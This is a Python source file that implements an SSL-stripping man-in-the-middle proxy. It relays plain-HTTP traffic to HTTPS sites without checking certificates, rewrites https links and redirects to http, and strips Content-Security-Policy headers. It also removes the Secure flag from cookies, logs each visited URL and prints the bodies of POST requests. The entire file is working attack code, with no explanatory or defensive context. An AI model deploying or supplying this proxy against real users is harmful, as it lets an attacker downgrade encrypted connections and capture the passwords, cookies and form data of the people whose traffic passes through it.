from threading import Thread
import http.server
import socketserver
import requests
import re

PORT: int = 10000

class ProxyServer():
    def __init__(self) -> None:
        self.thread: Thread = Thread(target=self.run_proxy)
        self.httpd = socketserver.ForkingTCPServer(('', PORT), MyProxy)

    def start(self) -> None:
        #self.thread.daemon = True
        self.thread.start()

    def stop(self) -> None:
        self.is_stopped = True
        print("Killing " + str(PORT))
        self.httpd.server_close()
        self.httpd.shutdown()

    def run_proxy(self):
        print("Now serving at " + str(PORT))
        self.httpd.serve_forever()


class MyProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self) -> None:
        url = 'https://' + self.headers['Host'] + self.path
        filteredheaders = {}
        skipped_req_headers = ['connection','accept-encoding','upgrade-insecure-requests']
        for header in self.headers:
            headlow = header.lower()
            #skip a few headers as we remove the encoding used
            if headlow not in skipped_req_headers:
                filteredheaders[header] = self.headers[header]

        req = requests.get(url, headers=filteredheaders, allow_redirects=False, verify=False)
        self.send_response_only(req.status_code)
        isTextReq = False
        skipped_res_headers = ['content-encoding','content-length','transfer-encoding','upgrade-insecure-requests','connection','location','content-security-policy','content-security-policy-report-only', 'set-cookie', 'alt-svc']
        for header in req.headers:
            headlow = header.lower()
            if headlow == 'content-type' and 'text/' in req.headers[header]:
                isTextReq = True
            #skip a few headers as we remove the encoding used
            if headlow not in skipped_res_headers:
                self.send_header(header, req.headers[header])
            if headlow == 'location':
                self.send_header(header, req.headers[header].replace('https://', 'http://'))
            if headlow == 'set-cookie':
                #remove the secure flag from a cookie
                regex = r"; ?secure"
                self.send_header(header, re.sub(regex, "", req.headers[header], 1, re.IGNORECASE))
        self.end_headers()
        print(self.headers['Host'] + self.path)
        if isTextReq:
            newData = req.text
            #remove https
            newData = newData.replace('https://', 'http://')
            self.wfile.write(bytes(newData, 'utf-8'))
        else:
            self.wfile.write(req.content)


    def do_POST(self) -> None:
        url = 'https://' + self.headers['Host'] + self.path
        data = None
        filteredheaders = {}
        skipped_req_headers = ['connection','accept-encoding','upgrade-insecure-requests']
        for header in self.headers:
            headlow = header.lower()
            if headlow == 'content-length':
                data = self.rfile.read(int(self.headers[header]))
            #skip a few headers as we remove the encoding used
            if headlow not in skipped_req_headers:
                filteredheaders[header] = self.headers[header]

        req = requests.post(url, data=data, headers=filteredheaders, allow_redirects=False)
        self.send_response_only(req.status_code)
        isTextReq = False
        skipped_res_headers = ['content-encoding','content-length','transfer-encoding','upgrade-insecure-requests','connection','location','content-security-policy','content-security-policy-report-only', 'set-cookie', 'alt-svc']
        for header in req.headers:
            headlow = header.lower()
            if headlow == 'content-type' and 'text/' in req.headers[header]:
                isTextReq = True
            #skip a few headers as we remove the encoding used
            if headlow not in skipped_res_headers:
                self.send_header(header, req.headers[header])
            if headlow == 'location':
                self.send_header(header, req.headers[header].replace('https://', 'http://'))
            if headlow == 'set-cookie':
                #remove the secure flag from a cookie
                regex = r"; ?secure"
                self.send_header(header, re.sub(regex, "", req.headers[header], 1, re.IGNORECASE))
        self.end_headers()
        print(self.headers['Host'] + self.path)
        if isTextReq:
            newData = req.text
            #remove https
            newData = newData.replace('https://', 'http://')
            self.wfile.write(bytes(newData, 'utf-8'))
        else:
            self.wfile.write(req.content)
        print(data)
